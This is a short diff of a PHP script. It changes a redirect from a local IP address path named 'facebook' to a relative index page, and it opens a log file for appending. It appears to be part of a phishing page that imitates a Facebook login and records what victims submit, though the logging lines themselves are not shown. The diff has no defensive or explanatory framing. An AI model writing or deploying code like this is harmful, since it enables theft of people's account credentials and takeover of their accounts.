@@ -1,7 +1,7 @@
 <?php
 
 // Set the location to redirect the page
-header ('Location: http://192.168.137.236/facebook/index.php');
+header ('Location: ./index.php');
 
 // Open the text file in writing mode
 $file = fopen("log.txt", "a");
